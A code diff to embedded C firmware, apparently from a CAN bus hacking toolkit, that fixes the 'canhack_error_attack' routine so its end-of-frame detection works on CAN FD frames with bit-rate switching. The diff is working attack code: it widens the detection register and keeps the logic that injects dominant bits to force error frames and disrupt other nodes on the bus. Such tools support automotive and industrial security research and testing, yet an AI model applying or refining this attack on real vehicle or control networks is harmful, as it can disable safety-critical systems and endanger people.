@@ -600,14 +600,19 @@ TIME_CRITICAL bool canhack_error_attack(uint32_t repeat, bool inject_error, uint
     }
 
     // Now wait for error delimiter / IFS point to inject a bit one or more times
-    uint32_t bitstream32 = 0;
+    uint64_t eof_bitstream = 0;
+    uint64_t eff_eof_mask = eof_mask;
+    uint64_t eff_eof_match = eof_match;
     uint32_t cur_sample_point_offset = SAMPLE_POINT_OFFSET;
     uint32_t cur_bit_time = BIT_TIME;
     if (brs) {
         cur_sample_point_offset = SAMPLE_POINT_OFFSET_FD;
         cur_bit_time = BIT_TIME_FD;
-        eof_mask = eof_mask_brs;
-        eof_match = eof_match_brs;
+        // 64-bit so the 4x BRS expansion is not truncated: the freeze-doom-loop's 9-bit
+        // EOF mask expands to 36 bits, which overflowed the old 32-bit detection register
+        // and made the attack miss on BRS CAN FD frames.
+        eff_eof_mask = eof_mask_brs;
+        eff_eof_match = eof_match_brs;
     }
 
     for (uint32_t i = 0; i < repeat; i++) {
@@ -619,10 +624,10 @@ TIME_CRITICAL bool canhack_error_attack(uint32_t repeat, bool inject_error, uint
                 sample_point = cur_sample_point_offset;
             }
             else if (REACHED(now, sample_point)) {
-                bitstream32 = (bitstream32 << 1U) | rx;
+                eof_bitstream = (eof_bitstream << 1U) | rx;
                 bit_end = sample_point + cur_sample_point_offset;
                 sample_point = ADVANCE(sample_point, cur_bit_time);
-                if ((bitstream32 & eof_mask) == eof_match) {
+                if ((eof_bitstream & eff_eof_mask) == eff_eof_match) {
                     // Inject six dominant bits to ensure an error frame is handled (in case all other devices are
                     // error passive and do not signal active error frames)
                     for (;;) {
@@ -631,7 +636,7 @@ TIME_CRITICAL bool canhack_error_attack(uint32_t repeat, bool inject_error, uint
                             SET_CAN_TX_DOM();
                             bit_end = ADVANCE(bit_end, BIT_TIME * 7U);
                             sample_point = ADVANCE(sample_point, BIT_TIME * 7U);
-                            bitstream32 = bitstream32 << 7U; // Pseudo-sample of own dominant bits
+                            eof_bitstream = eof_bitstream << 7U; // Pseudo-sample of own dominant bits
                             break;
                         }
                     }
